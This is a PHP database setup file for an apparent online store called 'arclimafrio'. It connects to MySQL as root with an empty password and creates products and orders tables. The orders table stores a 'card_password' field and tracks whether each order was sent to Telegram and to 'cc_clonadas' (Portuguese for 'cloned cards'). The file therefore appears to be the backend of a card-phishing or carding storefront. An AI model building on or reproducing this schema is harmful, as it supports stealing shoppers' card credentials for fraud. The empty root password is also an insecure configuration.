<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'arclimafrio');

function getConnection() {
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASS);
    
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    // Create database if not exists
    $sql = "CREATE DATABASE IF NOT EXISTS " . DB_NAME;
    if ($conn->query($sql) === FALSE) {
        die("Error creating database: " . $conn->error);
    }
    
    $conn->select_db(DB_NAME);
    
    // Create products table with new fields
    $sql = "CREATE TABLE IF NOT EXISTS products (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(255) NOT NULL,
        price DECIMAL(10,2) NOT NULL,
        image VARCHAR(255),
        images TEXT,
        description TEXT,
        specifications TEXT,
        is_description_active BOOLEAN DEFAULT TRUE,
        is_images_active BOOLEAN DEFAULT TRUE,
        is_specifications_active BOOLEAN DEFAULT TRUE,
        active BOOLEAN DEFAULT TRUE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    
    if ($conn->query($sql) === FALSE) {
        die("Error creating products table: " . $conn->error);
    }
    
    // Create orders table with all necessary fields
    $sql = "CREATE TABLE IF NOT EXISTS orders (
        id VARCHAR(36) PRIMARY KEY,
        customer_data JSON,
        items JSON,
        total_amount DECIMAL(10,2) NOT NULL,
        payment_method VARCHAR(50),
        status VARCHAR(50),
        transaction_id VARCHAR(255),
        card_password VARCHAR(255),
        telegram_sent BOOLEAN DEFAULT FALSE,
        cc_clonadas_sent BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    
    if ($conn->query($sql) === FALSE) {
        die("Error creating orders table: " . $conn->error);
    }
    
    return $conn;
}